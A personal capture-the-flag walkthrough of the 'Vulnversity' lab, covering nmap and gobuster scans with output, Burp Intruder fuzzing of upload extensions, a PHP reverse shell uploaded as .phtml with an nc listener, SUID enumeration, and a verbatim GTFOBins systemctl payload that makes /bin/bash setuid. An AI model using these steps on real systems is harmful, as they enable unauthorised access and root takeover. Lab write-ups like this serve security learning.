# Vulnversity

## get started
- 1)to connect download open vpn using ` sudo apt install openvpn `
then go to access page on openvpn and download your `.ov` file by seclect the server and click generate then connect to the netwoek using ` sudo openvpn MahmudEg2.vo `



## Reconnaissance 
- usng NMAP --> `nmap tool use to scan open ports.`
- first scan open ports on `10.9.4.424` (machone ip) using `nmap -sV 10.9.4.424`

>note : -sV for version of rinning service 
>       -sS TCP SYN port scan (setalth scan)
>       -sU UDP port scan
>       -A to enable OS and Version detection (n,ap build-in secript)

** - you will notice there is 6 ports are open **

```sh
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))


- the squid proxy version is 3.5.12

3128/tcp open  http-proxy  Squid http proxy 3.5.12

-if we scan using (-p-400) it will scan 400 ports

-the most likely opertating system is (ubuntu)

22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protoc>

-web server running on port 3333

3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

##exploting
- location directories using Gobuster: gobuster is tool use to scan directories by brouteforce from givin wordlist
first install gobuster
` sudo apt-get install gobuster `

- then you should have wordlist to use it to brutforce the locations in kali the wordlist locat in 
`/usr/share/wordlists`
` /usr/share/wordlists/dirbuster/directory-list-1.0.txt`

-start bruteforceing ` gobuster dir -u http://10.10.55.30:3333 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt `

```sh
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.55.30:3333/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 318] [--> http://10.10.55.30:3333/images/]                                                                             
/css                  (Status: 301) [Size: 315] [--> http://10.10.55.30:3333/css/]                                                                                
/js                   (Status: 301) [Size: 314] [--> http://10.10.55.30:3333/js/]
/internal             (Status: 301) [Size: 320] [--> http://10.10.55.30:3333/internal/]                                                                           
Progress: 141708 / 141709 (100.00%)
===============================================================
Finished
===============================================================
         
```

-the directory that has an upload form page `http://10.10.55.30:3333/internal/`

## Comprpmise the Webserver
   > we well use `Brupsuit`: it is tool use to inertupt the web browser request 

- first we need to creat txt file (php.txt) wordlist using
```sh
cat > phpext.txt
.php
.php3
.php4
.php5
.phtml
```

- run Brubsuit go to Intruder Tab  and click on Payoads --> select Sniper.
- click on Positions --> find the file --> click add $

> If the first time using Brubsuite
> Install foxyproxy extintion on your browser and then add new proxy (127.0.0.1:8080) in my case
then go to Brubsuit on Proxy Tab and run Intercept is on now send to intruder

- after setup configuration as we said 
- start the attack, notice that .phtml is a success

now we know that we can upload php file so we need to install PHP reverse from `https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php `

-edite the file by change the ip and port ( tun0 ip and any port i use 4433)
-change the `.php` extention to .phtml
-upload it to the /internal page (success)
-navigate to uplods you can guss it or brutforce using gubaster `http://10.10.55.30:3333/internal/uploads/`

then listen to the port using ` nc -lvnp 4433 `

-then click on `php-reverse-shell.phtml` at the page 
-you should notic that the connection to port `4433` is establishid
-now you can navigate the directories using (ls,cd) go to home so you can see the name of the user 
`bill`

-then we need to find user flag it seems to be text file names user has the flag insede it
you can serch it by using ` find / -name user.txt 2>/dev/null`
> note: `2>/dev/null` use to remove error masseges
 
-or you can find the file in /home/bill/user.txt and read it by cat command
- the flag is : `8bd7992fbe8a6ad22a63361004cfcedb`

## Privilege Escalation
-after login to victem machine now need to become superuser (root)
>SUID (set owner userId upon execution) is a particular type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).
 so know we need to fond SUID file we do that using (i found it by quick google search): 

```sh 
 find / -perm -u=s -type f 2>/dev/null
 it will response 
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```
-I chose /bin/systemctl case he said on system it just a guess

now at the final find root flag 

vist this site to know how to escleate to root `https://gtfobins.github.io/ `
-Just past system SUID that you find (systemctl) and you will find all commands you need then just copy and paste the code:
``` plain text
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
